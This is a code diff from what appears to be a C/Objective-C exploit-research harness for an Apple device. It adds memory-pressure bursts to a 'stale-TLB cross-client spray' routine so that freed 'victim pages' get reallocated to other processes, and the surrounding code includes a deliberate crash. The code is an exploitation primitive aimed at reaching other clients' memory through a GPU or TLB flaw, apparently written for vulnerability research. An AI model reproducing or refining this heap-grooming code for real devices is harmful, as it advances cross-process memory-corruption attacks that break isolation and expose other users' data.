@@ -17850,8 +17850,15 @@ static void p_uatrec(void) {
         // address/descriptor is OUR value. Unset = 0x41 + USK_STLE markers.
         const char *fills = getenv("FUZZ_UATREC_S4_FILL");
         uint64_t fill = fills ? strtoull(fills, NULL, 0) : 0;
-        LOG("[uatrec] S4 stale-TLB cross-client spray: %d rounds, cong %d, %dms/round, secs %d, nv %d, vsz 0x%x, fill 0x%llx%s",
-            rounds, cong, roundms, secs, nv, vsz, fill, fills ? "" : " (0x41+markers)");
+        // memory-pressure priming: periodic malloc/memset bursts force the
+        // physical allocator to churn our freed pages into other consumers.
+        // Clamped vs jetsam (device).
+        int pmb = atoi(getenv("FUZZ_UATREC_S4_PRESSURE_MB") ?: "0");
+        if (pmb > 1500) { LOG("[uatrec] S4: PRESSURE_MB %d > 1500, clamped (jetsam)", pmb); pmb = 1500; }
+        int pevery = atoi(getenv("FUZZ_UATREC_S4_PRESSURE_EVERY") ?: "5");
+        if (pevery < 1) pevery = 1;
+        LOG("[uatrec] S4 stale-TLB cross-client spray: %d rounds, cong %d, %dms/round, secs %d, nv %d, vsz 0x%x, fill 0x%llx%s, pressure %d MB/%d rounds",
+            rounds, cong, roundms, secs, nv, vsz, fill, fills ? "" : " (0x41+markers)", pmb, pevery);
 
         // system GPU load on the main thread: keep the screen on and make
         // WindowServer composite continuously (fresh GPU buffer allocs)
@@ -18057,6 +18064,26 @@ static void p_uatrec(void) {
                     LOG("[uatrec] S4: deliberate crash now (round %d, blits in flight)", round);
                     fsync(fileno(stderr));
                     *(volatile uint8_t *)0x0 = 0x42;
+                }
+            }
+            // memory-pressure priming: 16MB malloc+touch bursts held for 200ms
+            // then freed — forces the physical allocator to redistribute our
+            // freed victim pages into other consumers
+            if (pmb > 0 && round % pevery == pevery - 1) {
+                @autoreleasepool {
+                    int nch = pmb / 16;
+                    uint8_t **chunks = (uint8_t **)malloc(sizeof(uint8_t *) * (nch > 0 ? nch : 1));
+                    int got = 0;
+                    for (int i = 0; i < nch; i++) {
+                        chunks[i] = (uint8_t *)malloc(0x1000000);
+                        if (!chunks[i]) break;
+                        memset(chunks[i], 0x5a, 0x1000000);
+                        got++;
+                    }
+                    LOG("[uatrec] S4 pressure burst %d MB at round %d (%d chunks)", got * 16, round, got);
+                    usleep(200000);
+                    for (int i = 0; i < got; i++) free(chunks[i]);
+                    free(chunks);
                 }
             }
             if (round % 10 == 9) {
